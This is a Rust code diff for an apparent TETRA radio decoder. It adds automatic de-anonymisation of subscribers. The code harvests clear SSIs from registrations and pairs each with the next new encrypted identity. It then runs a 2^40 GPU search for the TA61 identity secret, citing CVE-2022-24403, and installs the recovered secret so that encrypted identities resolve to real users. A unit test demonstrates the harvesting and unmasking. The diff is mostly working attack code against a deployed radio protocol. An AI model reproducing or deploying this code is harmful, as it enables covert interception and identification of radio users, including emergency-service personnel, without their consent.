@@ -19,7 +19,10 @@
 use common::Result;
 use decode::tetra::{Address, CallPdu, Event, RESOURCE, TRAFFIC, TRAFFIC_END};
 #[cfg(feature = "tea")]
-use decode::gpu::GpuSearch;
+#[cfg(feature = "tea")]
+use decode::gpu::{GpuSearch, Ta61Gpu};
+#[cfg(feature = "tea")]
+use decode::ta61::IdPair;
 #[cfg(feature = "tea")]
 use decode::recover::{Progress, Search};
 #[cfg(feature = "tea")]
@@ -189,6 +192,23 @@ struct Crypto {
     /// SYSINFO and advanced on each multiframe wrap. `None` until seen.
     hyperframe: Option<u16>,
     last_multiframe: Option<u8>,
+    /// The (SSI, ESI) pairs harvested for TA61 identity recovery: three pin
+    /// down the secret `c` (CVE-2022-24403). Paired by the paper's timing
+    /// heuristic, so kept unique by SSI and by ESI to resist a mis-pair.
+    id_pairs: Vec<decode::ta61::IdPair>,
+    /// An SSI seen clear in a registration, waiting to be paired with the
+    /// next encrypted identity not seen before. The paper's correlation.
+    pending_ssi: Option<u32>,
+    /// Encrypted identities already seen, so "not previously seen" holds.
+    seen_esi: std::collections::HashSet<u32>,
+    /// Whether an identity-secret search has run and exhausted on the pairs
+    /// held, so it is not started again until a new pair arrives.
+    id_searched: bool,
+    /// The GPU searcher for the TA61 secret; `None` with no adapter (the
+    /// 2^40 sweep is GPU-only).
+    id_gpu: Option<Arc<Ta61Gpu>>,
+    /// An identity-secret search in flight: the colour, and the promise.
+    id_search: Option<(u8, Promise<Option<[u8; 8]>>)>,
 }
 
 #[cfg(feature = "tea")]
@@ -207,11 +227,17 @@ impl Crypto {
             reuse_pairs: Vec::new(),
             hyperframe: None,
             last_multiframe: None,
+            id_pairs: Vec::new(),
+            pending_ssi: None,
+            seen_esi: std::collections::HashSet::new(),
+            id_searched: false,
+            id_gpu: Ta61Gpu::new().map(Arc::new),
+            id_search: None,
         }
     }
 
-    /// Forget everything but the keys, which survive a resync: a key is valid
-    /// for the network, not the moment.
+    /// Forget everything but the keys and identity secrets, which survive a
+    /// resync: they are valid for the network, not the moment.
     fn reset(&mut self) {
         self.collisions.clear();
         self.recovery = None;
@@ -222,6 +248,11 @@ impl Crypto {
         self.reuse_pairs.clear();
         self.hyperframe = None;
         self.last_multiframe = None;
+        self.id_pairs.clear();
+        self.pending_ssi = None;
+        self.seen_esi.clear();
+        self.id_searched = false;
+        self.id_search = None;
     }
 }
 
@@ -255,6 +286,8 @@ pub struct TetraNode {
     last_aie: u8,
     /// When each address was last reported as a bare resource, by slot.
     resource_seen: HashMap<u32, u64>,
+    /// When each identity was last reported registering, by SSI and slot.
+    mm_seen: HashMap<u32, u64>,
     /// The cell's frequency band and offset from its SYSINFO, which is what
     /// a carrier number in an allocation or a neighbour is relative to.
     cell_band: Option<(u8, u8)>,
@@ -308,6 +341,7 @@ impl TetraNode {
             last_network: None,
             last_aie: 0,
             resource_seen: HashMap::new(),
+            mm_seen: HashMap::new(),
             cell_band: None,
             markers: HashMap::new(),
             marker_speech: HashMap::new(),
@@ -350,6 +384,82 @@ impl TetraNode {
             Address::Smi(e) => Address::Smi(real(e)),
             other => other,
         };
+    }
+
+    /// Note a subscriber seen clear in a registration or authentication: it
+    /// is the SSI half of a pair, waiting for the encrypted identity that
+    /// follows (TETRA:BURST section 5.3, the paper's timing correlation).
+    #[cfg(feature = "tea")]
+    fn note_clear_identity(&mut self, m: &decode::tetra::MmPdu, _slot: u64) {
+        if let Some(ssi) = m.address.ssi().filter(|s| *s != 0 && *s != 0xff_ffff) {
+            self.crypto.pending_ssi = Some(ssi);
+        }
+    }
+
+    /// Observe an encrypted identity on enciphered traffic. If a clear SSI
+    /// was just seen and this ESI is one not seen before, they are taken as
+    /// a pair. Three pairs pin down the TA61 secret, and a search is started.
+    #[cfg(feature = "tea")]
+    fn observe_esi(&mut self, c: &CallPdu) {
+        if c.aie == 0 {
+            return;
+        }
+        let Some(cell) = self.rx.cell else { return };
+        if self.crypto.id_secrets.contains_key(&cell.colour) {
+            return; // already de-anonymising this cell
+        }
+        let Some(esi) = c.address.ssi().filter(|e| *e != 0 && *e != 0xff_ffff) else { return };
+        // Only a not-previously-seen ESI can be the one that follows the
+        // registration just heard; a familiar ESI is unrelated traffic.
+        if !self.crypto.seen_esi.insert(esi) {
+            return;
+        }
+        let Some(ssi) = self.crypto.pending_ssi.take() else { return };
+        // A pair whose SSI or ESI is already held would double-count; keep
+        // the set distinct so three pairs are three real constraints.
+        if self.crypto.id_pairs.iter().any(|p| p.ssi == ssi || p.esi == esi) {
+            return;
+        }
+        self.crypto.id_pairs.push(IdPair { ssi, esi });
+        self.crypto.id_searched = false;
+        if self.crypto.id_pairs.len() >= 3 && self.crypto.recovery.is_none() {
+            self.start_id_recovery(cell.colour);
+        }
+    }
+
+    /// Start the 2^40 meet-in-the-middle for the TA61 secret over the pairs
+    /// held, on the GPU. Runs only when a GPU is present; the CPU form of
+    /// this sweep is not built, as 2^40 on CPU is not worth offering.
+    #[cfg(feature = "tea")]
+    fn start_id_recovery(&mut self, colour: u8) {
+        if self.crypto.id_searched {
+            return;
+        }
+        self.crypto.id_searched = true;
+        let Some(gpu) = self.crypto.id_gpu.clone() else { return };
+        let pairs = self.crypto.id_pairs.clone();
+        self.crypto.id_search = Some((colour, gpu.spawn(pairs, 0..1u64 << 40, 1 << 22)));
+    }
+
+    /// Poll a running identity-secret search; on success install the secret
+    /// so the cell's identities de-anonymise, and report its colour.
+    #[cfg(feature = "tea")]
+    fn poll_id_recovery(&mut self) -> Option<u8> {
+        let (colour, promise) = self.crypto.id_search.as_ref()?;
+        let colour = *colour;
+        match promise.ready() {
+            None => None,
+            Some(None) => {
+                self.crypto.id_search = None;
+                None
+            }
+            Some(Some(c)) => {
+                let c = *c;
+                self.crypto.id_search = None;
+                self.crypto.id_secrets.insert(colour, c);
+                Some(colour)
+            }
+        }
     }
 
     /// What this front end knows about the cell it hears and its key: the
@@ -441,6 +551,20 @@ impl TetraNode {
             return false;
         }
         self.resource_seen.insert(ssi, slot);
+        true
+    }
+
+    /// Whether an MM registration/authentication is a fresh row: once per
+    /// identity per [`RESOURCE_EVERY_SLOTS`], the same as a bare resource.
+    fn worth_an_mm_row(&mut self, m: &decode::tetra::MmPdu, slot: u64) -> bool {
+        let Some(ssi) = m.address.ssi().filter(|s| *s != 0 && *s != 0xff_ffff) else {
+            return false;
+        };
+        if self.mm_seen.get(&ssi).is_some_and(|last| slot.saturating_sub(*last) < RESOURCE_EVERY_SLOTS)
+        {
+            return false;
+        }
+        self.mm_seen.insert(ssi, slot);
         true
     }
 
@@ -948,9 +1072,13 @@ impl Node for TetraNode {
                     if let (Some(a), Some(band)) = (c.alloc.as_mut(), self.cell_band) {
                         a.band.get_or_insert(band);
                     }
-                    // Enciphered SDUs are the material a key search runs on.
+                    // Enciphered SDUs are the material a key search runs on;
+                    // the encrypted identity is a pair for the identity one.
                     #[cfg(feature = "tea")]
-                    self.collect_collision(&c, block.slot);
+                    {
+                        self.collect_collision(&c, block.slot);
+                        self.observe_esi(&c);
+                    }
                     events.push((Event::Call(c), block.slot));
                 }
                 Event::Network(mut n) => {
@@ -971,7 +1099,10 @@ impl Node for TetraNode {
         // Advance any key recovery in flight; a found key decodes the next
         // traffic without an operator entering anything.
         #[cfg(feature = "tea")]
-        self.poll_recovery();
+        {
+            self.poll_recovery();
+            self.poll_id_recovery();
+        }
 
         for (event, slot) in events {
             let bytes = event.to_bytes();
@@ -981,6 +1112,17 @@ impl Node for TetraNode {
                 Event::Sync(_) => (&mut self.last_sync, Event::identity_key(&bytes)),
                 Event::Sysinfo(_) => (&mut self.last_sysinfo, Event::identity_key(&bytes)),
                 Event::Network(_) => (&mut self.last_network, Event::identity_key(&bytes)),
+                // A registration or authentication: one row per identity per
+                // spell of them, like a bare resource, so a radio that keeps
+                // re-registering is not a scroll. Harvested for pairing too.
+                Event::Mm(m) => {
+                    #[cfg(feature = "tea")]
+                    self.note_clear_identity(&m, slot);
+                    if !self.worth_an_mm_row(&m, slot) {
+                        continue;
+                    }
+                    (&mut None, None)
+                }
                 Event::Call(c) if matches!(c.pdu, TRAFFIC | TRAFFIC_END) => (&mut None, None),
                 Event::Call(c) => {
                     if !self.worth_a_row(c, slot) {
@@ -1030,6 +1172,7 @@ impl Node for TetraNode {
         self.last_sysinfo = None;
         self.last_network = None;
         self.resource_seen.clear();
+        self.mm_seen.clear();
         self.markers.clear();
         self.marker_speech.clear();
         self.traffic.clear();
@@ -1146,6 +1289,18 @@ pub fn tetra_decoded(bytes: &[u8], center: common::Hz) -> Option<Decoded> {
                 fields.push((format!("cell_{}", nb.cell_id), Value::Text(s)));
             }
             "TETRA-Network"
+        }
+        Event::Mm(m) => {
+            let kind = match m.pdu {
+                decode::tetra::D_AUTHENTICATION => "authentication".to_string(),
+                decode::tetra::D_LOCATION_UPDATE_ACCEPT => "location update".to_string(),
+                other => format!("type {other}"),
+            };
+            fields.push(("mm".into(), Value::Text(kind)));
+            if let Some(ssi) = m.address.ssi() {
+                fields.push(("ssi".into(), Value::Int(ssi.into())));
+            }
+            "TETRA-MM"
         }
         Event::Aach(_) => return None,
     };
@@ -1431,5 +1586,55 @@ mod tests {
             matches!(node.key_status().unwrap().recovery, Recovery::NotTea1),
             "TEA1 ruled out after enough exhaustion"
         );
+    }
+
+    /// The identity harvester: a clear SSI in a registration, then the
+    /// encrypted identity that follows, become a pair. Three pairs are
+    /// gathered, and once the secret is known every ESI de-anonymises.
+    #[cfg(feature = "tea")]
+    #[test]
+    fn harvests_id_pairs_and_deanonymises() {
+        use decode::ta61::encrypt_id;
+        use decode::tetra::MmPdu;
+        use dsp::tetra::{Cell, TdmaTime};
+
+        let mut node = TetraNode::new(390_000_000.0);
+        let cell = Cell { mcc: 272, mnc: 91, colour: 5, scramb: coding::scramb_init(272, 91, 5) };
+        node.rx.seed(cell, TdmaTime { tn: 1, frame: 6, multiframe: 30 }, 0);
+        node.last_aie = 3;
+
+        let c = [0x11u8, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
+        let ssis = [0x12_3456u32, 0x00_4321, 0xab_cdef];
+
+        // Each registration (clear SSI) is followed by its encrypted call.
+        let mm = |ssi| MmPdu { pdu: 1, address: Address::Ssi(ssi), time: None };
+        let enc_call = |esi| CallPdu {
+            pdu: RESOURCE,
+            address: Address::Ssi(esi),
+            aie: 3,
+            e2e: None,
+            speech: None,
+            call_id: None,
+            from: None,
+            group: None,
+            time: None,
+            alloc: None,
+            marker: None,
+            seconds: 0.0,
+            text: None,
+            cipher: Vec::new(),
+        };
+        for &ssi in &ssis {
+            node.note_clear_identity(&mm(ssi), 0);
+            node.observe_esi(&enc_call(encrypt_id(&c, ssi)));
+        }
+        assert_eq!(node.crypto.id_pairs.len(), 3, "three pairs harvested");
+
+        // With the secret applied (as a recovery or hand entry would), the
+        // encrypted identity on a call decrypts to the real subscriber.
+        node.add_id_secret(5, c);
+        let mut c1 = enc_call(encrypt_id(&c, 0x12_3456));
+        node.deanonymize(&mut c1);
+        assert_eq!(c1.address, Address::Ssi(0x12_3456), "ESI de-anonymised to SSI");
     }
 }
